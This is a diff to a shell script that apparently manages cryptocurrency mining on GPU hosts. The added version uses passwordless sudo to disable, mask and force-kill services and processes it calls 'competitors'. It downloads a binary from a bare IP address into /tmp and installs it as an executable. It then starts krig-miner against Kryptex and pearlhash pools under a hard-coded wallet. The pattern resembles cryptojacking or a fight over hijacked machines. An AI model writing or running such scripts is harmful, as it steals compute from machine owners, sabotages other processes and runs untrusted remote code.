@@ -1,18 +1,23 @@
 set +e
-S="sudo -n"; H=$(hostname -s); echo "== diag3 $H $(date -u +%FT%TZ) ip=$(curl -s -m 8 https://api.ipify.org)"
-echo "--- ls nv"; ls -la /opt/nv 2>/dev/null | head -30
-echo "--- run.sh"; cat /opt/nv/run.sh 2>/dev/null | head -25
-echo "--- run-g.sh"; cat /opt/nv/run-g.sh 2>/dev/null | head -25
-echo "--- supervisor"; cat /opt/nv/supervisor.sh 2>/dev/null | head -15
-echo "--- units"; ls /etc/systemd/system 2>/dev/null | head -40
-echo "--- nv unit"; cat /etc/systemd/system/nv-cuda-cache@.service 2>/dev/null
-echo "--- procs"; ps -eo pid,ppid,args | grep -Ei '[p]eakminer|[k]rig|[w]ildrig|[s]rbminer' | cut -c1-190
-echo "--- bins"; find /opt /home/ubuntu -maxdepth 3 -type f \( -name '*krig*' -o -name '*wildrig*' -o -name '*peakminer*' -o -name '*srbminer*' \) 2>/dev/null | head -20
-echo "--- logs"; for f in $(ls -t /opt/nv/logs/*.log 2>/dev/null | head -3); do echo "## $f"; tail -6 "$f" | cut -c1-300; done
-echo "--- pool"
-for W in ul-t2-ps-$H-g0 ul-t19-149-81-10-242-g0; do R=$(curl -s -m 20 -H 'User-Agent: ul' 'https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz' | tr '{' '\n' | grep "$W"); echo "$W :: ${R:0:220}"; done
-echo "--- net"
-for hp in prl-sg.kryptex.network:8048 prl-sg.kryptex.network:7048 pool.pearlhash.xyz:9443 pool.pearlhash.xyz:9000; do h=${hp%:*}; p=${hp#*:}; timeout 8 bash -c "echo > /dev/tcp/$h/$p" 2>/dev/null && echo "$hp OPEN" || echo "$hp CLOSED"; done
-echo "--- ul-t2 log"; tail -8 /opt/ul-t2/logs/*.log 2>/dev/null | cut -c1-260
-echo "--- cron"; $S crontab -l 2>/dev/null | tail -6; echo "-- ul2 poll"; ls -la /home/ubuntu/ul2/ 2>/dev/null | head
+S="sudo -n"; H=$(hostname -s); W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz; WRK="ul-t2-ps-$H-g0"
+echo "== rp7 $H $(date -u +%FT%TZ)"
+echo "-- wallet file"; $S od -c /opt/ul-t2/wallet | head -3; $S wc -c /opt/ul-t2/wallet
+echo "-- killall competitors"
+$S systemctl disable --now supervisor.service nv-cuda-cache@0.service nv-cuda-cache.service nv-t19.service nv-t19v.service 2>&1 | head -6
+$S systemctl mask supervisor.service nv-cuda-cache@0.service nv-cuda-cache.service nv-t19.service nv-t19v.service 2>&1 | head -6
+$S systemctl stop ul-t2-ps@0 2>/dev/null
+$S pkill -9 -f '[p]eakminer'; $S pkill -9 -f '[k]rig-miner'; $S pkill -9 -f '[s]rb'; $S pkill -9 -f '/opt/nv/[k]eep.sh'; $S pkill -9 -f '/opt/nv/[s]upervisor.sh'; sleep 3
+echo "-- procs after"; ps -eo pid,ppid,args | grep -Ei '[p]eakminer|[k]rig|[s]rb|[k]eep|[s]upervisor' | cut -c1-120
+echo "-- get peakminer 2.21 from seed"
+curl -sf -m 180 -o /tmp/pm21 http://163.68.86.6:8090/peakminer; echo "curl rc=$? size=$(stat -c%s /tmp/pm21 2>/dev/null)"
+[ -s /tmp/pm21 ] && { $S install -m 755 /tmp/pm21 /opt/ul-t2/pm21; /opt/ul-t2/pm21 --version 2>&1 | head -2; }
+echo "-- krig variant a: wallet.worker tls"
+export CUDA_VISIBLE_DEVICES=0
+timeout 20 /opt/ul-t2/krig-miner --algo pearlhash --url stratum+ssl://prl-sg.kryptex.network:8048 -u "$W.$WRK" -p x --no-tui 2>&1 | head -8
+echo "-- krig variant b: -u wallet -w worker tls"
+timeout 20 /opt/ul-t2/krig-miner --algo pearlhash --url stratum+ssl://prl-sg.kryptex.network:8048 -u "$W" -w "$WRK" -p x --no-tui 2>&1 | head -8
+echo "-- krig variant c: tcp 7048"
+timeout 20 /opt/ul-t2/krig-miner --algo pearlhash --url stratum+tcp://prl-sg.kryptex.network:7048 -u "$W.$WRK" -p x --no-tui 2>&1 | head -8
+echo "-- krig variant d: pearlhash pool 9443"
+timeout 20 /opt/ul-t2/krig-miner --algo pearlhash --url stratum+ssl://pool.pearlhash.xyz:9443 -u "$W.$WRK" -p x --no-tui 2>&1 | head -8
 echo done
